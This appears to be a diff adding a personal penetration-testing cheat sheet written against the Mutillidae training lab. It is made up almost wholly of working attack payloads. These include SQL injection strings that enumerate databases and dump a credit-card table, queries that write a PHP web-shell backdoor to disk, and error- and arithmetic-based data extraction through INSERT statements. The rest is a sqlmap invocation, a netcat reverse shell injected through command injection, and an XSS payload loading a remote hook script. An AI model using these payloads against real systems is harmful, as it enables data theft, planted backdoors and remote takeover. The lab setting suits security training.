@@ -1,0 +1,77 @@
+### SELECT ###
+
+# basic
+' or 1=1 -- 
+' union select null -- 
+' union select null, null, null, null, null -- 
+
+# get databases
+' union select null, (select group_concat(distinct table_schema separator ',') from information_schema.tables order by table_schema), null, null, null -- 
+
+# get tables
+' union select null, (select group_concat(distinct table_name separator ',') from information_schema.tables where table_schema='owasp10' order by table_name), null, null, null -- 
+
+# get columns
+' union select null, (select group_concat(distinct column_name separator ',') from information_schema.columns where table_schema='owasp10' and table_name='credit_cards' order by table_name), null, null, null -- 
+
+# get cc numbers
+' union select null, (select concat(ccid, ':', ccnumber,':', ccv,':', expiration) from owasp10.credit_cards limit 1), null, null, null -- 
+
+# get cc numbers 3x
+' union select null, (select concat(ccid, ':', ccnumber,':', ccv,':', expiration) from owasp10.credit_cards limit 1), (select concat(ccid, ':', ccnumber,':', ccv,':', expiration) from owasp10.credit_cards limit 2,1), (select concat(ccid, ':', ccnumber,':', ccv,':', expiration) from owasp10.credit_cards limit 3,1), null -- 
+
+' union select null, null, null, null, (select "<?php echo exec($_GET['command']);?>" into outfile "/var/www/mutillidae/backdoor.php") -- 
+' union select null, null, null, null, (select "<?php echo exec($_GET['command']);?>" into outfile "/tmp/backdoor.php") -- 
+### INSERT ###
+# Basic
+
+# Insert error name_const()
+' or (SELECT * FROM (SELECT (name_const(version(),1)), name_const(version(),1)) a) or '  # can only get the version in latest version
+
+# ERROR 1210 (HY000): Incorrect arguments to NAME_CONST  <-- cannot do more
+# ERROR 1060 (42S21): Duplicate column name '2' <-- Good to go
+' or (SELECT * FROM (SELECT name_const((SELECT 2), 1),name_const((SELECT 2),1)) a) or '
+' or (SELECT * FROM (SELECT name_const((SELECT GROUP_CONCAT(distinct table_name separator ',') FROM information_schema.tables WHERE table_schema=database() order by table_name),1),name_const((SELECT GROUP_CONCAT(distinct table_name separator ',') FROM information_schema.tables WHERE table_schema=database() order by table_name),1)) a) or '
+
+# Insert error extractvalue() -- not supported by this DB
+' or extractvalue(1,concat(0x7e,database())) or '
+
+# There is no string concatenation in MySQL, we cannot UNION into an INSERT statement, and we cannot simply chain a query with a semi-colon in mysql.
+# we can, however, perform math.  (This will not work in strict mode, i.e. MySQL 5.7.5+)
+# Demo strings are numbers
+select 'osanda' = 0;
+select 'osanda'+~0; # ~0 is BIGINT, this gives us a double
+select ~0+0e0; # DOUBLE
+select (~0+0e0) = ('osanda' + ~0) ;  # Same
+select 'osanda' | ~0; # we can extract 8-byte strings as numbers
+
+# Insert conv(hex())
+select conv(hex('01234567'), 16, 10);
+select unhex(conv(3472611983179986487, 10, 16));
+
+# conv(hex()) w/ substr() -- select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);
+' | conv(hex(substr(user(),1, 8)), 16, 10) | '    ##  select unhex(conv(8245931987826405219, 10, 16));
+' | conv(hex(substr(user(),9, 16)), 16, 10) | '   ##  select unhex(conv(107118236496756, 10, 16));
+
+# In-band injection
+asdf', version()) -- # password field, password becomes asdf, signature gets replaced
+
+
+### SQLMAP ###
+sqlmap -u "192.168.56.101/mutillidae/index.php?page=user-info.php&username=lotus&password=lotus&user-info-php-submit-button=View+Account+Details"
+
+### COMMAND INJECTION ###
+
+# Basic
+&& echo ‘asdf’
+
+# Listen for connect-back
+nc -l -p 5000  # don't specify an IP here, it will filter
+
+# Connect-back
+&& nc 192.168.56.102 5000 -e /bin/bash
+
+
+### XSS ###
+# Pen Test Tool Lookup:
+"}}); } </script><script src="http://127.0.0.1:3000/hook.js"></script><script>var cat cat = ({"query": {"toolIDRequested": "asdf
